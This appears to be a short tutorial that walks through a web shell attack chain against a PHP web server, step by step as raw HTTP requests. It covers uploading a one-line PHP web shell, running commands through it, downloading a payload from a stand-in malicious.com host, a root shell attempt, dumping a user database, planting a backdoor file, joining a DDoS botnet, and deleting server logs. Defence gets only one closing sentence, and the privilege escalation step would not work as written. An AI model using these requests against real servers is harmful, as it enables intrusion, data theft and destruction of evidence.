# Introduction to LoL Web Shell Attack Technique
The following outlines a specific attack method in which a file infiltrated via a web request body is converted into a web shell and then used to perform additional malicious activities:

---

### **1. File Upload via Web Request Body**
- The attacker uploads a malicious script to a specific directory on the web server (e.g., `/var/www/html/`) via an HTTP POST request.
- For example, uploading a web shell targeting a PHP-based web server:
```http
POST /upload.php HTTP/1.1
Host: targetsite.com
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary
Content-Length: 1234

---WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
---WebKitFormBoundary--
```

- **Result:** The `webshell.php` file is uploaded to the server, enabling remote command execution.

---

### **2. Invoking the Uploaded Web Shell**
- The uploaded web shell is invoked via an HTTP GET request to execute commands.
- Example request:
```http
GET /webshell.php?cmd=ls HTTP/1.1
Host: targetsite.com
```

- **Result:** A list of files in the server directory is returned.

---

### **3. Download and Execute Additional Malware**
- Use the web shell to download and execute malware from a remote URL.
- Example web request:
```http
GET /webshell.php?cmd=wget+http://malicious.com/payload.sh+-O+/tmp/payload.sh HTTP/1.1
Host: targetsite.com
```

- **Result:** The `payload.sh` file is downloaded and executed, installing additional malware on the system.

---

### **4. Privilege Escalation**
- Exploit privilege escalation vulnerabilities on the server through the uploaded web shell.
- Example:
```http
GET /webshell.php?cmd=python+-c+"import+os;os.setuid(0);os.system('/bin/bash')" HTTP/1.1
Host: targetsite.com
```
- **Result:** Root privileges are obtained, giving the attacker full control over the server.

---

### **5. Data Exfiltration**
- Use the web shell to extract database credentials and directly query the database.
- Example:
```http
GET /webshell.php?cmd=mysql+-u+root+-psecret+-e+"SELECT+*+FROM+users;" HTTP/1.1
Host: targetsite.com
```
- **Result:** User information is exfiltrated from the database.

---

### **6. Backdoor Installation**
- The attacker installs a backdoor to maintain persistent access.
- Example:
```http
GET /webshell.php?cmd=echo+'<?php+system($_GET[cmd]);?>'+>+/var/www/html/backdoor.php HTTP/1.1
Host: targetsite.com
```
- **Result:** A new web shell `backdoor.php` is created.

---

### **7. Distributed Denial-of-Service (DDoS) Attack Execution**
- Use the web shell to convert the target server into part of a botnet network.
- Example:
```http
GET /webshell.php?cmd=perl+-e+'use+IO::Socket;...;+send_attack();' HTTP/1.1
Host: targetsite.com
```
- **Result:** The server is used in a DDoS attack.

---

### **8. Log Deletion**
- The attacker deletes traces of their activity.
- Example:
```http
GET /webshell.php?cmd=rm+-rf+/var/log/apache2/* HTTP/1.1
Host: targetsite.com
```
- **Result:** Server logs are deleted, making it difficult to trace the attack.

---

These techniques are carried out by exploiting unprotected file upload functions, improper input validation, and web server vulnerabilities. **Proper security measures** can prevent such attacks.

